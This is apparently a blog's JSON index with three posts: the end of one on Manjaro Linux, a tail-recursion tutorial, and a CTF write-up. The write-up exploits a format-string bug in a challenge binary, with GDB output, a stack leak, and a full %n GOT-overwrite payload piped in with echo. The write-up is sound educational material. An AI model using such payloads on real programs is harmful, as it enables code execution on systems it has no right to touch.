don\u0026rsquo;t provide any graphical installer like most distros and you have to configure it yourself from the groundup, a pretty awesome arch based distro is Manjaro which is bascially a simpified version of arch with all Arch\u0026rsquo;s perks and that\u0026rsquo;s what i have setteled on!\nManjaro for Cybersecurity So we now have an arch distro that is lightweigt, fully customizable and contains an awesome package manager with the arch user repositoty, and that\u0026rsquo;s not even the end! we can add to our manjaro setup the blackarch repo which contains as of writing this article a whooping 7030 security tool ready for installing at your fingertips!\nnow we can customize our own distro and bundle it with the tools we only need!\nThe Sky\u0026rsquo;s your limit Manjaro comes in differnt desktop enviroments, but i have actually tried all of them inclduing XFCE, KDE and MATE and the one that sucked the least was XFCE\u0026hellip;\nbut that was until i discovered the heaven of tiling window managers, which basically can speed up your keyboard smashing habits by 10x if you invested the little time into making it your own!\nhere are some pics of my Manjaro boxes!\nconfig\nconfig\n","description":"Since a couple months ago, I have decided to try and switch fully to linux and ditch that piece of junk they call windows.","id":18,"section":"posts","tags":["linux"],"title":"My Favorite Linux Distro","uri":"/posts/distro/"},{"content":"In this blog post i will try to explain the basic concept of recursion and then show why recursion can be so inefficient and how to optimize it using Call Tail Optimization!\nNormal Recursion, A Factorial Example Most of us tech nerds have already dealt with the good \u0026lsquo;ol recursion, let\u0026rsquo;s refresh our understanding using the iconic factorial program.\n$$0! = 1$$\n$$n! = n (n-1)!$$\nPython Implementation:\n1 2 3 4 5 def fact(x): if (x==0): return 1 else: return x * fact(x-1) But python is just too mainstream and overrated, let\u0026rsquo;s use Lisp!\n1 2 3 4 (define (fact x) (if (= x 0) 1 (* x (fact (- x 1))))) ain\u0026rsquo;t Scheme just too beautiful?\nNow, let\u0026rsquo;s inspect the program behavior!\nTracing The Recursion let\u0026rsquo;s say we want to execute (fact 5) which supposedly evaluates to 120.\nhere is the trace of the factorial operation:\n1 2 3 4 5 6 7 8 9 10 11 12 (fact 5) (* 5 (fact 4)) (* 5 (* 4 (fact 3))) (* 5 (* 4 (* 3 (fact 2)))) (* 5 (* 4 (* 3 (* 2 (fact 1))))) (* 5 (* 4 (* 3 (* 2 (* 1 (fact 0)))))) (* 5 (* 4 (* 3 (* 2 (* 1 1))))) (* 5 (* 4 (* 3 (* 2 1)))) (* 5 (* 4 (* 3 2))) (* 5 (* 4 6)) (* 5 24) 120 here\u0026rsquo;s the pythonic version for those who are struggling with lisp (it\u0026rsquo;s way easier believe me)\n1 2 3 4 5 6 7 8 9 10 11 12 fact(5) 5 * fact(4) 5 * (4 * fact(3)) 5 * (4 * (3 * fact(2))) 5 * (4 * (3 * (2 * fact(1)))) 5 * (4 * (3 * (2 * (1 * fact(0))))) 5 * (4 * (3 * (2 * (1 * 1)))) 5 * (4 * (3 * (2 * 1))) 5 * (4 * (3 * 2)) 5 * (4 * 6) 5 * 24 120 Did you figure out the flaw of our simple recursion implementation yet?\nIt\u0026rsquo;s pretty simple, the way we expand the factorial on each iteration so that it grows and keeps growing until we fully expand it is just so inefficient and wastes memory space.\nThe waste of memory space comes from the fact that each call of (fact x) will allocate a new stack frame to store its data, so we have used around 6 stack frames for this simple calculation, allocating and popping stack frames is a relatively intensive operation for the CPU.\nThe source of this flaw is the multiplication that we are performing with our recurred call.\nSo Tail Call Optimization or Tail Recursion are just fancy names for a simple rule we need to follow in order to optimize our recursive functions.\n\u0026ldquo;The recurred call shouldn\u0026rsquo;t be combined with other operations\u0026rdquo;\ni.e: we need to move the multiplication operator out of the recurred call in the factorial function\nUsing Tail Recursion let\u0026rsquo;s rewrite the factorial function in Tail Recursion:\n1 2 3 4 5 (define (fact-tail x accum) (if (= x 0) accum (fact-tail (- x 1) (* x accum)))) (define (fact x) (fact-tail x 1)) Pythonic version: 1 2 3 4 5 6 7 def factTail(x, accum): if (x == 0): return accum else: return factTail(x-1, x*accum) def fact(x): return factTail(x, 1) what we did in that snippet above is pretty simple, we just split the work across two functions, the first function (fact-tail x accum) will iterate and the second function (fact x) will call the first function and returns the value of each iteration (we have also moved the multiplication operation to it\u0026rsquo;s own variable) so we basically have no extra operations going on, in fact calling (fact 0) is now the same as calling (fact 10000) in terms of memory size.\nlet\u0026rsquo;s step through each iteration and see for ourselves how great is Tail Recursion:\n1 2 3 4 5 6 7 8 (fact 5) (fact-tail 5 1) (fact-tail 4 5) (fact-tail 3 20) (fact-tail 2 60) (fact-tail 1 120) (fact-tail 0 120) 120 Pythonic Version:\n1 2 3 4 5 6 7 fact(5) factTail(5, 1) factTail(4, 5) factTail(3, 20) factTail(2, 60) factTail(1, 120) factTail(0, 120) is this even recursion anymore, that\u0026rsquo;s just fancy iteration!\nwe have used recursion in such a way that we store all the data to perform our evalutaion in each individual reccured call!\nAll Hail Tail Call Optimization!\nMore Tail Recursion! here is one more example with the infamous fibonacci function in both normal Recursion and then Tail Recursion:\n(you try to implement it in python this time :p)\nNormal Recursion 1 2 3 4 (define (fib x) (cond ((= x 0) 0) ((= x 1) 1) (else (+ (fib (- x 1)) (fib (- x 2)))))) Tail Recursion 1 2 3 4 5 6 7 (define (fib x) (fib-iter x 0 1)) (define (fib-iter x a b) (cond ((= x 0) a) ((= x 1) b) (else (fib-iter (- x 1) b (+ a b))))) All Hail The Tail Recursion\n","description":"Recursion is a pretty improtant topic in programming and it's not that hard to grasp or even implement, but how about actually using it correctly?","id":19,"section":"posts","tags":null,"title":"Optimizing Recursion","uri":"/posts/recursion/"},{"content":" Misusage of the libc printf() function can lead to serious information leakage and even code execution. when we pass one argument (for example printf(foo)) we can: leak stack addresses using %x or %p format specifiers. overwrite any pointer\u0026rsquo;s value using %n specifier (note that we can\u0026rsquo;t overwrite plain stack addresses as the %n format specifier can only overwrite by reference and not by value) For more information on format strings please check this awesome resource\nAnalyzing the Binary we fire up GDB and list all our functions:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 gef‚û§ info functions All defined functions: Non-debugging symbols: 0x08049000 _init 0x08049030 printf@plt 0x08049040 fgets@plt 0x08049050 getegid@plt 0x08049060 puts@plt 0x08049070 system@plt 0x08049080 __libc_start_main@plt 0x08049090 setvbuf@plt 0x080490a0 setresgid@plt 0x080490b0 _start 0x080490f0 _dl_relocate_static_pie 0x08049100 __x86.get_pc_thunk.bx 0x08049110 deregister_tm_clones 0x08049150 register_tm_clones 0x08049190 __do_global_dtors_aux 0x080491c0 frame_dummy 0x080491c2 response 0x08049245 flaggy 0x08049270 main 0x080492eb __x86.get_pc_thunk.ax 0x080492f0 __libc_csu_init 0x08049350 __libc_csu_fini 0x08049351 __x86.get_pc_thunk.bp 0x08049358 _fini we notice three non-standard functions above which are:\n1 2 3 0x080491c2 response 0x08049245 flaggy 0x08049270 main by inspecting the disassembly for these three functions we find out that:\nmain function will call response function response function maybe vulnerable to a format string vulnerability (since there is a printf call) the flaggy function is a dead code, our goal is to call it. so let\u0026rsquo;s start by running some input on the binary, let\u0026rsquo;s test with a couple of %x\u0026rsquo;s:\nhegz@hegzbox:~/ractf/Not_Really_AI$ ./nra How are you finding RACTF? %x %x %x %x I am glad you 200 f7fb9580 80491d1 25207825 We hope you keep going! bingo!\nwe can leak stack addresses.\nExploitation since this binary is vulnerable to a format strings attack, we can use the %n specifer to overwrite any pointer value on the stack.\nBut can we really overwrite the return address?\nThe answer is No, we can\u0026rsquo;t do that since it is not a pointer, it\u0026rsquo;s a value and we can\u0026rsquo;t overwrite values on the stack using %n\nOur approach to this challenge will be through overwriting the \u0026ldquo;Global Offset Table\u0026rdquo;\u0026hellip;\nto put it simply, the Global Offset Table is somewhere in the bss section of the binary where shared library functions are mapped to their addresses.\nIf we can overwrite one of these function addresses (for example puts() GOT address) then, when we want to execute this function (the puts) it will instead execute our arbitary function.\nwe check our vulnrable function for candiadtes:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 gef‚û§ disas response Dump of assembler code for function response: 0x080491c2 \u0026lt;+0\u0026gt;: push ebp 0x080491c3 \u0026lt;+1\u0026gt;: mov ebp,esp 0x080491c5 \u0026lt;+3\u0026gt;: push ebx 0x080491c6 \u0026lt;+4\u0026gt;: sub esp,0x204 0x080491cc \u0026lt;+10\u0026gt;: call 0x8049100 \u0026lt;__x86.get_pc_thunk.bx\u0026gt; 0x080491d1 \u0026lt;+15\u0026gt;: add ebx,0x2e2f 0x080491d7 \u0026lt;+21\u0026gt;: sub esp,0xc 0x080491da \u0026lt;+24\u0026gt;: lea eax,[ebx-0x1ff8] 0x080491e0 \u0026lt;+30\u0026gt;: push eax 0x080491e1 \u0026lt;+31\u0026gt;: call 0x8049060 \u0026lt;puts@plt\u0026gt; 0x080491e6 \u0026lt;+36\u0026gt;: add esp,0x10 0x080491e9 \u0026lt;+39\u0026gt;: mov eax,DWORD PTR [ebx-0x8] 0x080491ef \u0026lt;+45\u0026gt;: mov eax,DWORD PTR [eax] 0x080491f1 \u0026lt;+47\u0026gt;: sub esp,0x4 0x080491f4 \u0026lt;+50\u0026gt;: push eax 0x080491f5 \u0026lt;+51\u0026gt;: push 0x200 0x080491fa \u0026lt;+56\u0026gt;: lea eax,[ebp-0x208] 0x08049200 \u0026lt;+62\u0026gt;: push eax 0x08049201 \u0026lt;+63\u0026gt;: call 0x8049040 \u0026lt;fgets@plt\u0026gt; 0x08049206 \u0026lt;+68\u0026gt;: add esp,0x10 0x08049209 \u0026lt;+71\u0026gt;: sub esp,0xc 0x0804920c \u0026lt;+74\u0026gt;: lea eax,[ebx-0x1fdd] 0x08049212 \u0026lt;+80\u0026gt;: push eax 0x08049213 \u0026lt;+81\u0026gt;: call 0x8049060 \u0026lt;puts@plt\u0026gt; 0x08049218 \u0026lt;+86\u0026gt;: add esp,0x10 0x0804921b \u0026lt;+89\u0026gt;: sub esp,0xc 0x0804921e \u0026lt;+92\u0026gt;: lea eax,[ebp-0x208] 0x08049224 \u0026lt;+98\u0026gt;: push eax 0x08049225 \u0026lt;+99\u0026gt;: call 0x8049030 \u0026lt;printf@plt\u0026gt; 0x0804922a \u0026lt;+104\u0026gt;: add esp,0x10 0x0804922d \u0026lt;+107\u0026gt;: sub esp,0xc 0x08049230 \u0026lt;+110\u0026gt;: lea eax,[ebx-0x1fcf] 0x08049236 \u0026lt;+116\u0026gt;: push eax 0x08049237 \u0026lt;+117\u0026gt;: call 0x8049060 \u0026lt;puts@plt\u0026gt; 0x0804923c \u0026lt;+122\u0026gt;: add esp,0x10 0x0804923f \u0026lt;+125\u0026gt;: nop 0x08049240 \u0026lt;+126\u0026gt;: mov ebx,DWORD PTR [ebp-0x4] 0x08049243 \u0026lt;+129\u0026gt;: leave 0x08049244 \u0026lt;+130\u0026gt;: ret End of assembler dump. we see a puts call after the vulnerable printf function, that\u0026rsquo;s our candiadte.\nAlright, now it\u0026rsquo;s time to collect all the pieces of the puzzle.\nIn order to start writing our exploit, we will need two pieces of information:\nThe memory address we are overwriting \u0026ndash;\u0026gt; puts GOT address The memory address we are overwriting with \u0026ndash;\u0026gt; flaggy to get the puts GOT address we can disassemble the puts address located at response\u0026lt;+117\u0026gt;:\n1 2 3 4 5 6 gef‚û§ disas 0x8049060 Dump of assembler code for function puts@plt: 0x08049060 \u0026lt;+0\u0026gt;: jmp DWORD PTR ds:0x804c018 0x08049066 \u0026lt;+6\u0026gt;: push 0x18 0x0804906b \u0026lt;+11\u0026gt;: jmp 0x8049020 End of assembler dump. then we examine the destination address of the jump instrcution above to make sure its the GOT address:\n1 2 gef‚û§ x 0x804c018 0x804c018 \u0026lt;puts@got.plt\u0026gt;: 0x08049066 and voila, 0x804c018 is our desired address!\nnow we need the flaggy function address:\n1 2 gef‚û§ x flaggy 0x8049245 \u0026lt;flaggy\u0026gt;: 0x53e58955 and our address is 0x8049245\n(note: don\u0026rsquo;t confuse the address with its value, i.e: in the above snippet we have two hex numbers where 0x8049245 is the address/pointer and 0x53e58955 is the value of that pointer/address)\nTime to write our Exploit! our exploit will look like this (Abstracted):\n[Address_of_puts][Address_of_flaggy][Address_of_puts entry number on the stack]\nlet\u0026rsquo;s dig a bit deeper into each of these parts:\n[Address_of_puts]:\nthis is the simplest of the three, and it\u0026rsquo;s basically our GOT puts address which we obtained above, but encoded in little endian Address_of_puts = \\x18\\xc0\\x04\\x08 [Address_of_flaggy]:\nif we recall back, we mentioned that the %n specifier will write the printed character length to a specified pointer.\nour goal here is to encode the Address of flaggy function as a padded address, for example we want to encode this address 0x8049245\nthe format will be: %(integer value of the address - 4)x where the 4 is the length of the [Address_of_puts]\nusing any calculator or just python, we can calculate the integer value of any hex address: 1 2 \u0026gt;\u0026gt;\u0026gt; int(0x8049245 - 4) 134517313 so our final payload will be: %134517313x\n[Address_of_puts entry number on the stack]:\nto calculate the offset of puts in our printf stack leak, we use an Egg i.e: AAAA, and follow it with some %x\u0026rsquo;s until we can locate it\u0026rsquo;s offset. hegz@hegzbox:~/ractf/Not_Really_AI$ ./nra How are you finding RACTF? AAAA %x %x %x %x %x %x %x %x I am glad you AAAA 200 f7fb9580 80491d1 41414141 20782520 25207825 78252078 20782520 we see that our offset is the 4th entry after the egg, so our payload will be: %x %x %x %n or we can use the special feautre of printf %4$n which does the same thing.\nfull payload:\n\\x18\\xc0\\x04\\x08%134517313x%4$n\nwe will use echo to print and pipe it to the binary (we also escape the $ and append a \\x0a for a newline):\necho -en \\x18\\xc0\\x04\\x08%134517313x%4\\\\$n\\x0a | ./nra\na lot of blank spaces will be printed, and eventually our flag\u0026hellip;\nractf{f0rmat_Str1nG_fuN}\n","description":"This is a Binary exploitaion challenge, based around a format string vulnerability.","id":20,"section":"posts","tags":["pwn"],"title":"Not Really AI - RA CTF","uri":"/posts/notreallyai/"}]